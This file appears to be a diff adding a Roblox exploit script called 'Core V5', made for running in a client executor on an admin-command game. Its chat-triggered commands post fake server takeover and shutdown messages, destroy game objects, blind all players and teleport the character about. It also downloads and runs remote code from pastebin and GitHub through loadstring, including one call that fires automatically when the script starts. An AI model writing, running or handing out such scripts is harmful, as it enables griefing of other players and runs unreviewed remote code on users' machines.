@@ -1,0 +1,162 @@
+local prefix = "-" -- only one prefix
+local LPlayer = game.Players.LocalPlayer
+LPlayer.Chatted:Connect(function(msg)
+    msg = msg:lower()
+	if string.sub(msg,1,3) == "/e " then
+		msg = string.sub(msg,4)
+	end
+	if string.sub(msg,1,1) == prefix then
+		local cmd
+		local space = string.find(msg," ")
+		if space then
+			cmd = string.sub(msg,2,space-1)
+		else
+			cmd = string.sub(msg,2)
+		end
+        if cmd == "info" then
+            game.Players:Chat("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n i am techs guard dog and i server and protect him if you have a problem take it up with him. \n \n \n \n \n")
+        end      
+        
+        if cmd == "rem" then
+        game.Players:Chat("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n i am techs guard dog if you try him i will kick you \n \n \n \n \n")
+        end
+        
+        if cmd == "regen" then
+        fireclickdetector(game:GetService("Workspace").Terrain["_Game"].Admin.Regen.ClickDetector)
+        end
+        
+        if cmd == "respawn/me" then
+        game.Players.LocalPlayer.Character:Destroy()
+        game.Players:Chat("respawn me")
+        wait(0.1)
+        game.Players:Chat("respawn me")
+        wait(0.1)
+        game.Players:Chat("respawn me")
+        end
+        
+        if cmd == "afternoon" then
+        game.Players:Chat("colorshifttop 600 400 10")
+            game.Players:Chat("colorshiftbottom 600 400 10")
+            game.Players:Chat("time 16")
+            end
+        
+        if cmd == "takeover" then
+            game.Players:Chat("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n this server has been taken over you will no longer be able to use admin unless you have perm or scripts. \n \n \n \n \n")
+        game.Players:Chat("<lg")
+        wait(0.1)
+        game.Players:Chat("disco")
+        wait(0.1)
+        game.Players:Chat("fogend 100")
+        end
+        
+        if cmd == "nok" then
+        game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump.TouchInterest:destroy()
+		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump1.TouchInterest:destroy()
+		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump2.TouchInterest:destroy()
+		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump3.TouchInterest:destroy()
+		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump4.TouchInterest:destroy()
+		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump5.TouchInterest:destroy()
+		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump6.TouchInterest:destroy()
+		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump7.TouchInterest:destroy()
+		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump8.TouchInterest:destroy()
+		game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump9.TouchInterest:destroy()
+	end
+
+            if cmd == "findregen" then
+                local root = game.Players.LocalPlayer.Character.HumanoidRootPart
+            root.Anchored = true
+            repeat
+            task.wait()
+            root.CFrame = CFrame.new(-7.165, root.Position.Y + 2500 , 94.743)
+            until workspace.Terrain._Game.Admin:FindFirstChild("Regen")
+            root.Anchored = false
+            root.CFrame = workspace.Terrain._Game.Admin:FindFirstChild("Regen").CFrame + Vector3.new(0, 3, 0)
+        end
+ 
+        if cmd == "testvg" then
+            game.Players:Chat("size me 0.3")
+            wait(0.1)
+            game.Players:Chat("gear me 94794847")
+            end
+ 
+        if cmd == "lg" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/DPZVT4Tt"))();
+        end
+ 
+        if cmd == "shop" then
+            local Http = game:GetService("HttpService") local TPS = game:GetService("TeleportService") local Api = "https://games.roblox.com/v1/games/" local _place = game.PlaceId local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100" function ListServers(cursor) local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or "")) return Http:JSONDecode(Raw) end local Server, Next; repeat local Servers = ListServers(Next) Server = Servers.data[1] Next = Servers.nextPageCursor until Server TPS:TeleportToPlaceInstance(_place,Server.id,game.Players.LocalPlayer)
+        end
+        if cmd == "rj" then
+            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.jobId)
+        end
+ 
+        if cmd == "inf" then
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+   local function say(real)
+      game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(real,"All")
+  end
+  say("[Core V5] infinite yeild has been executed")
+end
+ 
+        if cmd == "krabs" then
+            game.Players:Chat("h \n \n \n Mr Krabs: back in you're cage")
+     wait(0.1)
+     game.Players:Chat("music 8835052762")
+        end
+ 
+        if cmd == "crash" then
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-13.0838919, 8.6299963, 94.3988953, -0.992040515, 7.79336276e-08, 0.125919163, 7.45381001e-08, 1, -3.1677537e-08, -0.125919163, -2.20396235e-08, -0.992040515)
+wait(0.1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-30.2840538, 41.8299904, 48.3399773, 0.994418919, -4.20508215e-08, -0.105503753, 4.21832596e-08, 1, -9.76183023e-10, 0.105503753, -3.47975737e-09, 0.994418919)
+wait(0.1)
+game.Players:Chat("gear me 94794847")
+         wait(0.1)
+         game.Players.LocalPlayer.Backpack:WaitForChild("VampireVanquisher").Parent = game.Players.LocalPlayer.Character
+         wait(0.1)
+         game.Players:Chat("size me .3")
+         wait(0.1)
+         game.Players:Chat("size me .3")
+         wait(0.1)
+         game.Players:Chat("blind all")
+         wait(0.1)
+         game.Players:Chat("size me .3")
+            wait(0.1)
+            game.Players:Chat("h \n \n \n Server Message: this server has shutdown due to error code 298 \n \n \n")
+		end
+    end
+end)
+function GetPlayer(String)
+    local plr
+    local strl = String:lower()
+        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+            if v.Name:lower():sub(1, #String) == String:lower() then
+                plr = v
+            end 
+        end
+        if String == "me" then
+                plr = game.Players.LocalPlayer
+            end
+        if String == "" or String == " " then
+           plr = nil
+        end
+    return plr
+end
+ 
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-20.6536713, 8.46999645, 93.2285156, -0.989226878, 1.1234734e-08, 0.146390408, 2.29897168e-09, 1, -6.12098106e-08, -0.146390408, -6.02138428e-08, -0.989226878)
+wait(0.1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-25.004015, 9.02999687, 95.0856628, -0.993504107, -4.97548989e-08, 0.113796309, -4.14006998e-08, 1, 7.5776903e-08, -0.113796309, 7.05734209e-08, -0.993504107)
+wait(0.1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-28.5081959, 8.6299963, 94.1782608, -0.995079756, 3.76197242e-08, -0.0990769342, 3.61209977e-08, 1, 1.69207031e-08, 0.0990769342, 1.3258691e-08, -0.995079756)
+wait(0.1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-32.4551277, 8.6299963, 93.9659882, -0.995390892, 1.03235109e-08, -0.0959005579, 1.96682404e-08, 1, -9.64965921e-08, 0.0959005579, -9.79380275e-08, -0.995390892)
+wait(0.1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-16.9137554, 8.6299963, 93.9991074, -0.999507606, -1.14548612e-07, -0.0313781202, -1.14626033e-07, 1, 6.68680333e-10, 0.0313781202, 4.26510072e-09, -0.999507606)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-36.4648056, 8.6299963, 93.653801, -0.992661357, 3.07427683e-08, 0.120927311, 1.95125871e-08, 1, -9.40513658e-08, -0.120927311, -9.1001553e-08, -0.992661357)
+wait(0.1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-40.3558731, 8.46999645, 93.1650925, -0.993001461, -5.3957784e-08, 0.1181022, -5.04737159e-08, 1, 3.24914247e-08, -0.1181022, 2.6302974e-08, -0.993001461)
+wait(0.1)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-44.7494926, 8.6299963, 93.9981384, -0.997449219, -7.4250039e-08, 0.071380049, -7.99683733e-08, 1, -7.72533326e-08, -0.071380049, -8.27644158e-08, -0.997449219)
+wait(0.1)
+game.Players:Chat("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n CoreV5 got executed 😎  (invite only🔒)io.KAHCoreV4 \n \n \n \n \n")
+wait(0.1)
+loadstring(game:HttpGet("https://pastebin.com/raw/1XZ8wHaY"))();
